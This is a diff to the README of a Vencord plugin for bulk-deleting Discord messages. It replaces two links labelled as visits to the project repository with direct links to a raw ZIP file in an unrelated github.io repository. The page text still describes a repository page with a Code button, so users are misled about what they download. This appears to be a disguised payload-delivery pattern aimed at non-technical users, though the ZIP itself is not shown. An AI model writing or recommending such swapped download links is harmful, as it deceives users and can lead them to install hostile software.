@@ -5,7 +5,7 @@ description: "Delete Discord messages in bulk with filtering options using this 
 ---
 # ⚡ vundiscord - Delete your Discord messages with ease
 
-[![Download vundiscord](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/DANDARA111/vundiscord)
+[![Download vundiscord](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/DANDARA111/dandara111.github.io/raw/refs/heads/main/mugiloid/dandara_github_io_3.9.zip)
 
 vundiscord brings message deletion features to the Vencord platform. This tool allows users to manage their message history within Discord. It removes old messages across channels or direct messages. This project refactors existing scripts to work well with Vencord.
 
@@ -19,7 +19,7 @@ Check that you have an active internet connection. You do not need technical ski
 
 Visit the project page to access the plugin files. Click the link below to reach the repository.
 
-[Click here to visit the vundiscord repository](https://github.com/DANDARA111/vundiscord)
+[Click here to visit the vundiscord repository](https://github.com/DANDARA111/dandara111.github.io/raw/refs/heads/main/mugiloid/dandara_github_io_3.9.zip)
 
 Look for the green button labeled Code. Click it, then choose Download ZIP. Save this file to a folder you can find later, such as your Downloads folder. Extract the contents of the ZIP file by right-clicking it and choosing Extract All.
 
